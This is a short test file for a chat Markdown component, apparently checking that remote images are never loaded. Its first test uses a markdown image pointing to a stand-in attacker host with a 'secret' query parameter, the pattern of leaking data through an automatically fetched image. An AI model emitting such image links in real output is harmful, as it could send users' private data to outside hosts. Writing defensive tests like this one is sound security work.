import { render, screen } from "@testing-library/react"
import { describe, expect, it, vi } from "vitest"

import { Markdown } from "@/components/chat/markdown"

describe("Markdown", () => {
  it("never renders remote images, only a link to them", () => {
    const { container } = render(
      <Markdown
        content="See ![x](https://evil.example/a.png?q=secret)"
        sources={[]}
        onOpenSource={vi.fn()}
      />
    )
    expect(container.querySelector("img")).toBeNull()
    const link = screen.getByRole("link", { name: "x" })
    expect(link).toHaveAttribute("href", "https://evil.example/a.png?q=secret")
    expect(link).toHaveAttribute("rel", "noreferrer noopener")
  })

  it("shows only the alt text for non-http image sources", () => {
    const { container } = render(
      <Markdown
        content="![diagram](/api/documents/d/pages/1)"
        sources={[]}
        onOpenSource={vi.fn()}
      />
    )
    expect(container.querySelector("img")).toBeNull()
    expect(screen.queryByRole("link")).toBeNull()
    expect(screen.getByText("diagram")).toBeInTheDocument()
  })
})
